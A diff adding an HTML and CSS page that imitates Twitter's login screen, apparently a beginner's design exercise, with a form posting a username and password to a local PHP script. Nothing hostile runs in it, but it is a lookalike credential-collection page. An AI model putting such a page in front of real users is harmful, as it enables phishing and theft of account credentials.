@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  
+<meta charset="UTF-8">
+  
+<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+
+<!-- displays site properly based on user's device -->
+
+  
+ <title>Twitter Login Page</title>
+
+
+<style>
+body{
+      width: 100%;
+    height: auto;
+    font-family: 'Karla', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    font size: 16px
+}
+
+.header-right {
+    float: right;
+	color: blue;}
+
+
+.header {
+    overflow: hidden;
+    background-color: white;
+    padding: 10px 10px;
+  }
+  
+  .header a {
+    color: Blue;
+        padding: 9px;
+    text-decoration: none;
+    font-size: 18px;
+    line-height: 25px;
+    border-radius: 4px;
+  }
+
+  
+h1{padding: 8px;}
+
+
+#myLinks {
+  text-decoration: none;
+  text-align: center;
+color:black;}
+
+.fa {
+  padding: 20px;
+  font-size: 30px;
+  width: 30px;
+  text-align: center;
+  text-decoration: none;
+  margin: 5px 2px;
+  border-radius: 50%;
+}
+
+.fa:hover {
+    opacity: 0.7;
+}
+
+.fa-twitter {
+  background: white;
+  color: white;
+}
+
+/* Extra small devices (phones, 600px and down) */
+@media only screen and (max-width: 600px) {
+  .header, .fa, .fa-twitter  {width: 100%;}
+}
+
+/* Large devices (laptops/desktops, 992px and up) */
+@media only screen and (min-width: 992px) {
+  .header, .fa, .fa-twitter {background: white;}
+} 
+
+
+.g{margin:5px;
+ }
+
+.Ca{float: right;
+color: Blue;
+padding: 10px 20px;
+  margin: 25px 10px;
+
+}
+
+
+button {
+  background-color: blue;
+  color: white;
+  padding: 10px 20px;
+  margin: 25px 10px;
+   border-radius: 11px;  
+  cursor: pointer;
+  width: 100%;
+}
+
+button:hover {
+  opacity: 0.8;
+}
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+}
+
+</style>
+</head> 
+<body>
+<div class="header">
+            <div class="header-right">
+			  <a href="#" class="fa fa-twitter"></a>
+	     <a class="active" href="index.html">Sign up </a>
+         </div>     
+		</div>
+
+<fieldset>
+<legend><h1>Log in to Twitter.</h1></legend>
+<div class="g">
+<form action="form_submit.php" method="post">
+<label for="Username">Phone, email or username</label><br>
+<input type="text" id="Username" name="Username" required><br>
+<label for="pwd">Password</label><br>
+<input type="Password" id="pwd" name="pwd" required>
+</form>
+</div>
+<br>
+
+<div class="g">
+<a href id="myLinks">Forgot password?</a>
+</div>
+</fieldset>
+
+
+<hr>
+<div class="Ca">
+<button type="submit" value="submit">Login</button>
+</div>
+
+
+
+<footer style="margin:20%;">   
+            <div copyright>
+                <p style="text-align: center;"><small>&copy; 2020<br> All Rights Reserved. <br>
+                Designed by <a href="www.github.com" target="">Sammie Kei</a></small></p>
+            </div>
+        </footer>
+
+</body>
+</html>
